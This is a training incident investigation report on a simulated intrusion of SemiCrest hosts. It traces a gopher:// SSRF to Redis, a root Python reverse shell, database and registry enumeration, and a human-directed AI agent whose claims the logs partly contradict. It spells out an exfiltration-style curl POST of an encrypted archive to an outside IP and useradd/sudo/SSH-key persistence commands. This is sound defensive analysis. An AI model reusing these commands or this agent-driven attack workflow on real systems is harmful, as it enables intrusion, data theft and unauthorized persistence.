# Operation QUARTZFANG Investigation Report

SemiCrest Technologies simulated incident

[Download the original investigation report](reports/QUARTZFANG_Investigation_Report.docx)

Prepared by Golam Tanvir Rahman  
Report date 28 October 2026  
Workspace LAW-HuntPractice  
Primary event window 20 September 2026 06:30 to 08:30 UTC

## Executive assessment

The reviewed telemetry supports compromise of sc-portal01, root-level command execution through a cron-launched Python process, configuration-file access, reuse of internal service credentials, database enumeration, registry inspection, and an attempted outbound archive upload. Account creation and modification commands support a subsequent persistence attempt.

The operation is best assessed as human-directed AI-assisted execution. Recovered operator directives authorize phase transitions while the agent narrates tactical activity. Infrastructure logs corroborate several actions, but contradict the claimed extraction of admin-platform secrets: the recorded secrets request returned HTTP 403 Forbidden.

This is a training investigation, not an assessment of a real organization. The case brief associates the scenario with Campaign C0062. That contextual attribution was supplied by the exercise and was not independently established from these host logs.

### Scope and environment

| Host | IP | Role |
| --- | --- | --- |
| sc-portal01 | 10.5.0.10 | Portal application and initial entry point |
| sc-db01 | 10.5.0.20 | PostgreSQL database |
| sc-registry01 | 10.5.0.30 | Harbor container registry |
| sc-admin01 | 10.5.0.40 | Internal admin platform |

### Evidence and time handling

This report uses the supplied screenshots, CSV exports, case information, and investigation discussion. It does not represent direct access to the full workspace. Infrastructure times below are UTC; the user interface displayed Mountain Daylight Time, six hours behind UTC. Repeated rows were not treated as independent actions without distinguishing evidence.

Recovered agent records display 24 October 2026, although the infrastructure events are dated 20 September. Agent statements are correlated by session, content, hosts, and process evidence; their timestamps are not merged into the September timeline. The reason for this date discrepancy is unknown.

## Initial access and execution

### Preview API exploitation

PortalAccessLog_CL recorded two requests from 203.0.113.87 to /api/v1/preview. At 06:52:30 UTC, a file:// request targeting /etc/passwd returned HTTP 400. At 06:52:48, a gopher:// request targeting 127.0.0.1:6379 returned HTTP 200. The scheme changed within 18 seconds. This establishes an attempted local-file read followed by an accepted request carrying Redis-style commands.

The visible gopher payload contains FLUSHALL and SET but ends partway through its content. It does not independently establish the complete Redis write sequence. HTTP 200 shows the application accepted the request; code execution is established by the subsequent process and Syslog evidence.

### Observed execution chain

The exercise explanation identifies the intended chain as preview API SSRF to local Redis, Redis writing a crontab entry, and cron executing a Python reverse shell. The reviewed evidence directly supports the request and cron-to-Python stages. A Redis-origin crontab file-write event was not located in the reviewed file or Syslog records.

| UTC time | Observed event | Evidence |
| --- | --- | --- |
| 06:52:30 | file:// request rejected with 400 | PortalAccessLog_CL |
| 06:52:48 | gopher:// request accepted with 200 | PortalAccessLog_CL |
| 06:52:49 | Cron logs the root Python socket and shell command | Syslog.SyslogMessage |
| 06:52:52 | Python PID 4401 created as root by cron PID 4400 | DeviceProcessEvents_CL |
| 06:52:55 | PID 4401 contacts 203.0.113.87 on port 443 | DeviceNetworkEvents_CL |

### Process ancestry

Recorded process relationships: cron PID 4400 → python3 PID 4401 → cat PID 4410, env PID 4411, find PID 4412, curl PID 4430, and later account-management processes. These relationships tie multiple phases to the initial reverse-shell process. They are the relationships represented by telemetry; an intervening shell is not added to the recorded tree without a corresponding event.

The Python command connects a socket to 203.0.113.87:443, redirects standard input and output to it, and starts /bin/sh. The corresponding network event supports the callback. Port 443 alone does not establish HTTPS: this initial Python command shows no TLS wrapping.

### Privilege interpretation

AccountName=root confirms the suspicious Python process ran with root privileges. No separate privilege-escalation mechanism was established. The www-data queue-drain cron event occurred later and was not demonstrated to cause the initial execution.

## Credential access and internal service activity

### Configuration file access

At 07:05:15 UTC, cat PID 4410 ran cat /etc/semicrest/portal.conf as root, with python3 PID 4401 recorded as its parent. At 07:05:21, env PID 4411 ran under the same parent; find PID 4412 followed at 07:05:27, searching for configuration and environment files.

The recovered agent model_response presents configuration contents identifying portal_svc for PostgreSQL at 10.5.0.20:5432 and ci-builder for Harbor at 10.5.0.30. Passwords are deliberately omitted from this report. These values are reported configuration contents in agent narration, not independent file-content capture. Service telemetry corroborates use of the named accounts against the corresponding services.

The env process records show no command output and blank AdditionalFields in both matching rows. Additional environment credentials therefore cannot be determined from those events. Command execution is not evidence of the values printed by the command.

### PostgreSQL enumeration

At 07:16:14 UTC, sc-db01 logged an authorized portal_svc connection from 10.5.0.10. A nine-second query burst followed, from 07:16:16 to 07:16:25, targeting users, projects, customers, table metadata, and pg_catalog.pg_shadow.

| UTC time | Recorded SQL |
| --- | --- |
| 07:16:16 | SELECT * FROM users |
| 07:16:19 | SELECT * FROM projects |
| 07:16:22 | SELECT * FROM customers |
| 07:16:23 | SELECT table_name FROM information_schema.tables WHERE table_schema='public' |
| 07:16:25 | SELECT * FROM pg_catalog.pg_shadow |

Compared with normal application activity, the discriminators are unrestricted whole-table reads, schema and credential-related catalog targeting, and a compact cross-table burst. Baseline queries commonly select specific columns, apply application filters or limits, and use placeholders such as $1. The account name and portal source IP occur in legitimate activity and are insufficient discriminators alone. Statement logs do not show the returned rows or prove that every query succeeded.

### Harbor registry activity

At 07:33:01 to 07:33:05 UTC, ci-builder issued login, list_repository, pull_manifest, and inspect_layer operations from 10.5.0.10, with HTTP 200 responses. The repository was semicrest/portal-build. This differs from the supplied baseline of pull_artifact and push_artifact activity from CI server 10.5.0.100. Registry credentials do not establish compromise of the CI server itself.

### Admin platform access

sc-admin01 logged portal_svc requests from 10.5.0.10. The /api/v1/services and /api/v1/topology endpoints returned 200; /api/v1/secrets returned 403. The evidence establishes enumeration and a denied secrets request, not extraction through that request.

## Collection exfiltration and persistence

### Archive preparation and upload

DeviceFileEvents_CL recorded creation of report.tar.gz.enc under /tmp/.portal-cache/ by openssl at approximately 08:02 UTC. The recovered agent later claims that a report was compiled, compressed, encrypted, and staged there. The filename and file-creation event support an encrypted-output staging lead, but the complete packaging command, archive contents, cipher, and size were not established in the reviewed evidence.

The upload process command uses curl -s -X POST to https://198.51.100.210:443/upload with a multipart file argument pointing to /tmp/.portal-cache/report.tar.gz.enc. curl PID 4430 ran as root with Python PID 4401 recorded as its parent. At 08:15:08 UTC, a network event to 198.51.100.210:443 attributes the connection to python3 PID 4401.

The command and connection support attempted exfiltration with an observed outbound connection. The reviewed evidence does not include an upload response, exit status, byte count, or receiver acknowledgement proving full archive delivery. The agent’s claim of a completed transfer is not sufficient by itself. The curl child record and Python-attributed network record should be preserved as recorded rather than treated as an exact process-ID match.

### Separation from legitimate HTTPS

Both legitimate and suspicious connections use port 443 and can be labeled python3. Normal examples map to Gunicorn command lines under www-data, launched by bash through /opt/semicrest/start.sh. The suspicious connection maps to root Python PID 4401, launched by cron with socket and shell code. Process ancestry, command line, and execution account provide the stronger distinction.

### Persistence evidence

The attacker-linked Python process launched useradd PID 4440 with useradd -m -s /bin/bash svc_monitor. usermod PID 4441 ran a command adding svc_monitor to the sudo group. Subsequent mkdir and ssh-keygen activity prepared an SSH directory and an Ed25519 key pair under /home/svc_monitor/.ssh/. The displayed key-generation command used an empty passphrase.

These process records support account-based persistence preparation and attempted administrative group membership. The file telemetry also records creation of id_ed25519 and id_ed25519.pub around 08:29 to 08:30 UTC. No authorized_keys installation, successful SSH login, or verified sudo policy outcome was supplied. Key generation alone does not prove inbound passwordless access.

### Impact boundaries

Confirmed or directly observed effects include root process execution, configuration-read commands, database query activity, registry inspection, denied admin secrets access, archive-file creation, an upload command and network connection, and persistence commands. Exact database contents obtained, additional environment secrets, successful full upload, and durable SSH re-entry remain unverified.

## Agent reliability human control and noise

### Claims requiring independent verification

| Agent claim | Infrastructure evidence | Assessment |
| --- | --- | --- |
| Admin Kubernetes secrets extracted | /api/v1/secrets returned 403 | Claim contradicted for the recorded request |
| Admin database credentials found in an image layer | Registry inspection occurred; layer contents were not supplied | Credential claim unverified; actual layer contents unresolved |
| All accessible database data extracted | Table and catalog query statements recorded | Queries corroborated; returned data and completeness unverified |
| Exfiltration completed and passwordless persistence established | Upload and account/key commands plus related file/network events | Activity corroborated; delivery and re-entry not proven |

The exercise labels the registry credential claim as a hallucination, but this investigation did not receive the independent layer-content record needed to state what the image actually contained. The claimed db_admin pair must not be promoted to a verified credential or reproduced as fact.

### Human decision gates

Session qf-c062-9e4a contains one initial mission directive and four subsequent distinct operator directives. They concern foothold review before credential harvesting and lateral movement; lateral-movement review before database collection and admin probing; intelligence sufficiency and target coverage before documentation and staging; and review before exfiltration and persistence. Two directives share 01:48:31 in the October agent-log display and have different text, so they are retained as distinct records.

This count describes distinct post-tasking directives in the provided export. A scoring scheme that groups the same-time directives into one phase boundary could count transitions differently. gate_decision is documented as a guardrail verdict and was not treated as a human authorization count.

### Automation assessment

Human directives and agent narration support human-directed AI-assisted execution. Infrastructure timing adds corroboration: the preview scheme correction took 18 seconds and the database query sequence spanned nine seconds. Such speed is compatible with automation but does not uniquely identify AI. Agent records and independent telemetry must be evaluated together.

### Scanner and operational noise checks

External scanning was observed from 198.51.100.31, 198.51.100.45, and 198.51.100.62. Each aggregate showed 30 request rows and similar path sets in short intervals. The internal scanner was 10.5.0.250 with a Nessus user agent. Aggregate make_set output does not preserve request order; coordinated sequencing should be checked against raw timestamps before claiming it. Source, tooling, timing, and scheduled-scan context jointly discriminate the activity.

The 07:30 UTC database spike contains connection-limit failures, repeated connection attempts, and normal parameterized INSERT and UPDATE statements. It is best treated as operational noise consistent with connection exhaustion and application retries, rather than another observed enumeration burst. The underlying cause and attacker contribution are unproven. The nightly local pg_dump command is also insufficiently suspicious by account name alone; historical schedule and parent-process validation remain necessary.

## Evidence references and response priorities

### Evidence sources

| Source | Fields used | Finding supported |
| --- | --- | --- |
| PortalAccessLog_CL | TimeGenerated, SrcIpAddr, UrlOriginal, HttpStatusCode, UserAgent | Reconnaissance and preview request correction |
| DeviceProcessEvents_CL | Timestamp, DeviceName, ProcessId, ProcessCommandLine, AccountName, InitiatingProcessId, InitiatingProcessFileName | Execution ancestry, reads, upload and persistence commands |
| DeviceNetworkEvents_CL | Timestamp, DeviceName, RemoteIP, RemotePort, InitiatingProcessId, InitiatingProcessFileName | Callback and outbound transfer connection |
| Syslog | TimeGenerated, Computer, ProcessName, SyslogMessage | Cron, database SQL and exhaustion, admin API responses |
| ContainerRegistryLog_CL | TimeGenerated, Computer, Username, Operation, Repository, SrcIpAddr, HttpStatusCode | Registry access and inspection pattern |
| DeviceFileEvents_CL | Timestamp, DeviceName, FileName, FolderPath, ActionType, InitiatingProcessFileName | Archive and SSH key file creation |
| LLMAgentLogs_CL | TimeGenerated, session_id, user_input, model_response, gate_decision | Operator control, claimed tactical activity and reliability gaps |

Supporting exports reviewed in this investigation include New query (18)(1).csv for portal processes, New query (20)(1).csv and New query (22)(1).csv for database logs, New query (21)(1).csv for cross-table account matches, and New query (23)(1).csv for agent directives and narration. Supplied screenshots provide the detailed request, registry, admin, network, and persistence observations. No file hashes or evidence-acquisition chain of custody were recorded.

### Recommended response

Contain sc-portal01 and preserve volatile process, connection, scheduler, and filesystem evidence before cleanup. Investigate cron entries and Redis configuration and persistence files to recover the missing write mechanism. Remove public exposure or unnecessary URL schemes from preview fetching, enforce destination restrictions, and prevent access to loopback and private services unless explicitly required.

Rotate the database and registry credentials in coordination with application updates. Scope affected accounts by behavior and access logs rather than disabling the shared account without assessing service dependencies. Restrict Redis to the minimum necessary network and filesystem permissions, and avoid privileged execution for Redis and web components.

Investigate svc_monitor creation, group membership, SSH configuration, authorized_keys, ownership, and login activity. Recover and inspect the staged archive, relevant container layers, upload responses, and byte-level transfer records where available. Validate actual data exposure before asserting complete compromise or extraction.
